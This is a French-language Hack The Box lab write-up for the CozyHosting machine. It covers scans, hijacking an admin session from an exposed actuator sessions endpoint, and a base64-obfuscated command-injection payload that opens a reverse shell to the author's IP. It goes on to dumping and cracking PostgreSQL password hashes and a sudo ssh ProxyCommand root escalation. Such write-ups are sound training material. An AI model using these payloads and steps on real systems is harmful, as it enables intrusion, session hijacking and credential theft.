  # CozyHosting

	echo "10.10.11.230 cozyhosting.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.10.11.230 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 10.10.11.230 -oN nmap.txt
	feroxbuster --silent -u http://cozyhosting.htb
	dirb http://cozyhosting.htb
	
Scans classiques.

	PORT STATE SERVICE VERSION  
	22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
	80/tcp open http nginx 1.18.0 (Ubuntu)  
	8000/tcp open http-alt?  
	8001/tcp open vcom-tunnel?  
	8083/tcp open us-srv?  
	8084/tcp open websnp?  
	8087/tcp open simplifymedia?  
	8088/tcp open radan-http?  
	8089/tcp open unknown

Quelques pages intéressantes pour le site du port 80 : 
<br>	  http://cozyhosting.htb/error
<br>	  http://cozyhosting.htb/login
<br>	  http://cozyhosting.htb/admin
<br>	  http://cozyhosting.htb/actuator 

Ce dernier lien amène sur une page contenant un fichier JSON, mais il y a aussi un répertoire **/actuator/sessions** contenant des numéros ressemblant à des cookies : 

> {"4F348676237277F41E9D3A090A6C962E":"UNAUTHORIZED","9F43555484B4D2F9F2CD0DAFEDD36249":"kanderson","0D1C93626FCA31EB3D35893B255A83CD":"kanderson","A916BC0AB3F9FBD5B11A0B0124576924":"UNAUTHORIZED","2978E55AF45A3F7F53A30F7B050B4F2B":"kanderson","35A7E3432573357D6BC2FF8A3D8C590D":"UNAUTHORIZED"}

Ces numéros sont au même format que le "JSESSIONID" que l'on peut voir dans Burp en interceptant les requêtes vers **/login** et **/admin** 

En testant tous les cookies avec le Repeater de Burp sur la page http://cozyhosting.htb/admin on finit par accéder au panneau d'administration avec le paramètre "Cookie: JSESSIONID=9F43555484B4D2F9F2CD0DAFEDD36249"

Plus bas dans la page on voit un système de patching automatique, et en envoyant une requête de test on remarque un nom de page extrêmement intéressant dans Burp : 

> POST /executessh HTTP/1.1

En terminant la requête on obtient une erreur qui est également très intéressante : 

> ssh: Could not resolve hostname aaa: Temporary failure in name resolution

Cela sous-entend qu'il y a une exécution de commande et donc éventuellement une possibilité d'injection. J'ai directement testé avec un reverse-shell parce que la fonctionnalité permet justement de se connecter un hôte et c'est exactement ce que l'on veut.

Voir https://github.com/six2dez/pentest-book/blob/master/exploitation/reverse-shells.md#linux pour les payloads obfusqués donnant un reverse-shell.

Payload utilisé : 
	
	;echo${IFS}"c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNDQvNDQzIDA+JjE="|base64${IFS}-d|bash;

Paramètres à envoyer : 

	host=10.10.16.44&username=%3Becho%24%7BIFS%7D%22c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNDQvNDQzIDA%2BJjE%3D%22%7Cbase64%24%7BIFS%7D-d%7Cbash%3B

Réception sur ma machine : 
	
	rlwrap nc -nvlp 443

### Élévation de privilèges :

	python3 -c "import pty ; pty.spawn('/bin/bash');"

On ne peut pas faire grand chose mais il y a un fichier .jar potentiellement intéressant dans le dossier /app où on atterrit après l'injection de commande. La commande "scp" semble ne pas fonctionner alors j'ai ouvert un port en tant que serveur web avec Python : 

	python3 -m http.server 9999

Plus qu'à le télécharger et à le dézipper chez moi : 

	wget http://10.10.11.230:9999/cloudhosting-0.0.1.jar
	cloudhosting-0.0.1.jar

On trouve des identifiants de connexion PostgreSQL dans le fichier **./BOOT-INF/classes/application.properties** 
En se connectant à la base de données et en la fouillant on trouve des mots de passe hashés, et il y en a un qui est assez faible pour être cracké : 

	psql postgresql://localhost:5432/cozyhosting -U postgres
	SELECT * FROM users;
	...
	echo '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm' > hash.txt
	hashid '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm' -m
	hashcat -a 0 -m 3200 '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm'  ~/wordlists/rockyou.txt
	
Sur la machine il n'y a qu'un autre utilisateur nommé Josh et le mot de passe trouvé fonctionne pour lui, il n'y a plus qu'à pivoter et terminer l'élévation de privilèges  : 

	ssh josh@10.10.11.230
	cat user.txt
	sudo -l

> User josh may run the following commands on localhost:  
&nbsp;&nbsp;&nbsp;&nbsp;(root) /usr/bin/ssh *

Voir https://gtfobins.github.io/gtfobins/ssh/#sudo

	sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
	cat /root/root.txt


